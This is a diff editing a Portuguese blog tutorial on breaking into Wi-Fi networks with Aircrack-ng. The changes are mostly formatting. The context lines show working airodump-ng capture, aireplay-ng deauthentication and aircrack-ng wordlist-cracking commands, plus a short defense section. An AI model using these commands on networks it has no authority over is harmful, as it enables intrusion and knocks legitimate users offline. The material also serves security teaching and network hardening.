@@ -1,8 +1,7 @@
 ---
-layout: post
 title:  "Invasão de Redes Wireless com Aircrack-NG"
-date:   2016-04-16
 categories: seguranca
+tags: aircrack-ng wifi linux
 ---
 
 ![{{ post.title }}]({{ site.url }}/assets/img_posts/aircrack-ng.png)
@@ -20,7 +19,6 @@ Aproveite este conhecimento para progredir de maneira justa e sem prejudicar out
 Para a realização deste tutorial será necessário um computador com o Sistema Operacional Debian ou variantes e que a máquina possua placa de rede wireless ou adaptador wi-fi, e acesso _root_.
 
 Também é necessário que você possua uma _wordlist_ disponível em seu ambiente.
-
 
 ### Informação
 
@@ -76,10 +74,10 @@ airmon-ng start wlan0
 
 ## Listando Clientes
 
-Pegue os dados do seu alvo e insira-os nas opções entre colchetes (apague os colchetes depois), abaixo:
+Pegue os dados do seu alvo e insira-os nas opções entre chaves (apague as chaves depois), abaixo:
 
 ```sh
-airodump-ng mon0 --bssid [MAC ADDRESS] --channel [CHANNEL] --write wifi.test
+airodump-ng mon0 --bssid {MAC_ADDRESS} --channel {CHANNEL} --write wifi.test
 ```
 
 Depois disso, o scanner lhe mostrará uma lista com todas as Wokstations (clientes) que estão conectados na rede.
@@ -89,7 +87,7 @@ Depois disso, o scanner lhe mostrará uma lista com todas as Wokstations (client
 Abra um novo terminal, escolha uma workstation ativa e capture os pacotes dela (ela irá cair durante esse processo):
 
 ```sh
-aireplay-ng -0 100 -a [GATEWAY IP] -c [WORKSTATION IP] mon0 --ignore-negative-one
+aireplay-ng -0 100 -a {GATEWAY IP} -c {WORKSTATION IP} mon0 --ignore-negative-one
 ```
 
 ## Descobrindo a Senha
@@ -102,7 +100,7 @@ aircrack-ng wifi.test-01.cap -w wordlist.txt
 
 ## Como impedir esse tipo de invasão?
 
-Sempre utilize senhas complexas combinando caracteres especiais, como **!@#$%¨&#038;*()_+§**, e se possível configure como oculto o SSID da rede (embora o Aircrack-ng detectá-la) para que ela não seja listada como um possível alvo de crackers.
+Sempre utilize senhas complexas combinando caracteres especiais, como **!@#$%¨&#038;*()_+§**, e se possível configure como oculto o SSID da rede (embora o Aircrack-ng detectá-la) para que ela não seja vista como um possível alvo de crackers.
 
 ## Atualização
 
